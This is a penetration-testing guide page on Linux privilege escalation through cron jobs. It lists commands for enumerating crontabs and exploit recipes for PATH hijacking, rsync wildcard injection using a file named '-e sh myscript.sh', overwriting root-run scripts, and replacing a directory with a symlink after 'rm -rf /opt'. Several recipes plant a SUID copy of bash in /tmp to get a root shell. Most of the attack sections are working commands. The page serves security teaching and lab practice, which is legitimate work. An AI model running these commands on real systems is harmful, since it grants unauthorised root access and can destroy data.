# Cron Jobs

## Theory

Cron is a job scheduler in Unix-based operating systems. Cron Jobs are used for scheduling tasks by executing commands at specific dates and times on the server.\
By default, Cron runs as root when executing _/etc/crontab_, so any commands or scripts that are called by the crontab will also run as root. It can be an intresting privelege escalation path.

## Practice

### Misc Cron Jobs

{% tabs %}
{% tab title="Enumerate" %}
You may want to enumerate cron jobs with the following commands

```bash
#Print jobs with Crontab binary
crontab -l
crontab -l -u username

#Directly cat files
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"

#In /etc/ and subfolders
cat /etc/crontab
cat /etc/cron*/*

# In /var/spool
cat /var/spool/cron/*
cat /var/spool/cron/crontabs/*
```
{% endtab %}

{% tab title="Monitor" %}
By using [**pspy**](https://github.com/DominicBreuker/pspy), you can fetch processes without root privileges. It can be useful to detect cron jobs

```bash
# -p: print commands to stdout
# -f: print file system events to stdout
# -i: interval in milliseconds
./pspy64 -pf -i 1000
```
{% endtab %}
{% endtabs %}

### Cron Path&#x20;

{% tabs %}
{% tab title="Enumerate" %}
For example, inside _/etc/crontab_ you can find the PATH: `PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`

We need to check if we have **permissions** to write on each path, if a the binary in the cron job is specified without the full command path, we&#x20;

```bash
$ cat /etc/crontab

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    path-exploit.sh
```
{% endtab %}

{% tab title="Exploit" %}
We need to check if we have permission to write each path.

```bash
ls -al /usr/local/
ls -al /usr/
ls -al /
```

Assume we can write an arbitrary binary file under **`/home/user`**, and its specified in the crontab PATH as in the example. We can create a payload in there.&#x20;

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/path-exploit.sh
chmod +x /home/user/path-exploit.sh
```

Then wait for the job to execute.

```bash
/tmp/bash -p
```
{% endtab %}
{% endtabs %}

### Wildcard Injection

{% tabs %}
{% tab title="Enumerate" %}
If a cron job script executed by root has a **`*`** inside a command, you may be able to exploit it.&#x20;

```bash
$ cat /etc/crontab

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    rsync -a *.sh rsync://host.back/src/rbd
```
{% endtab %}

{% tab title="Exploit" %}
In the previous case, we can exploit it like this

```bash
touch "-e sh myscript.sh"

echo '<PAYLOAD>' > myscript.sh
```

Read the following page for more wildcard exploitation tricks: [HERE](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)
{% endtab %}
{% endtabs %}

### File Overwriting and Symlink

{% tabs %}
{% tab title="Enumerate" %}
If you **can modify a cron job script** executed by root, or it use a **directory where you have full access**, the we can exploit it.

```bash
$ cat /etc/crontab

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    /opt/crons/overwrite.sh
```
{% endtab %}

{% tab title="Exploit" %}
If we have write permissions on the script, we can exploit by overwriting it:

```bash
#Check you have permissions
ls -la /opt/crons/overwrite.sh

#Overwrite
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /opt/crons/overwrite.sh

#Wait until it is executed
/tmp/bash -p
```

If we have **full access over the directory**, maybe it could be useful to delete that folder and **create a symlink folder to another one** serving a script controlled by you

```bash
#Check you have permissions
ls -la /

#Remove folder and create the symlink target
rm -rf /opt
mkdir /tmp/crons

#Create a new script
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /tmp/crons/overwrite.sh

#Create symlinl folder
ln -d -s /tmp/crons/ /opt/crons/
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

{% embed url="https://tryhackme.com/room/linuxprivescarena" %}
